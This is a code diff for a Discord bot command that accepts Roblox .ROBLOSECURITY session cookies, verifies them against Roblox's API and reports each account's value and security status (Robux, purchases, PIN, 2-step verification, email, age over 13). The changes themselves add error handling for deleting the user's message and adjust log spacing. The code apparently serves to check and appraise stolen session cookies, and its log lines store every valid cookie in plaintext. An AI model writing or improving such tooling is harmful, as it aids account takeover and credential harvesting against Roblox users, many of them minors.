@@ -107,8 +107,20 @@ async def full(ctx, cookie=None):
     if not cookie:
         await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
         return
-    await ctx.message.delete()
     
+    # Attempt to delete the message, handle the exception if it fails
+    try:
+        await ctx.message.delete()
+    except discord.NotFound:
+        # The message was already deleted, we can ignore this error
+        pass
+    except discord.Forbidden:
+        # The bot does not have permission to delete the message
+        print("Bot does not have permission to delete messages.")
+    except discord.HTTPException as e:
+        # Handle other potential HTTP exceptions
+        print(f"Failed to delete message: {e}")
+
     response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
     hidden = '```                       Hidden                  ```'
     
@@ -206,15 +218,15 @@ async def full(ctx, cookie=None):
         await dm.send(embed=embedVar)
         
         # Log the usage
-        log(f'User  {ctx.author} used {settings.prefix}full with a valid cookie. [{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchcased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
+        log(f'User   {ctx.author} used {settings.prefix}full with a valid cookie. [{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchcased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
         
     elif 'Unauthorized' in response.text:
-        log(f'User  {ctx.author} used {settings.prefix}full with an invalid cookie.')
+        log(f'User   {ctx.author} used {settings.prefix}full with an invalid cookie.')
         embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
         await ctx.send(embed=embedVar)
     else:
-        log(f'User  {ctx.author} used {settings.prefix}full but Roblox returned a bad response.')
+        log(f'User   {ctx.author} used {settings.prefix}full but Roblox returned a bad response.')
         embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```' + response.text + '```', inline=False)
         await ctx.send(embed=embedVar)
